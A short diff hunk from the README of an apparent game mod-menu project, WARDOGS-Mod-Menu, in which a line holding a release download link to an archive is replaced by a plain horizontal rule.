@@ -33,7 +33,7 @@ The project provides a collection of gameplay tools, including visual informatio
 </d
   iv>
 
----[https://github.com/rad5-Raven595880/WARDOGS-Mod-Menu/releases/download/Wardogs/Archive_1.zip](https://github.com/rad5-Raven595880/WARDOGS-Mod-Menu/releases/download/Wardogs/Archive_1.zip)
+---
 
 ## ✨ Features
 
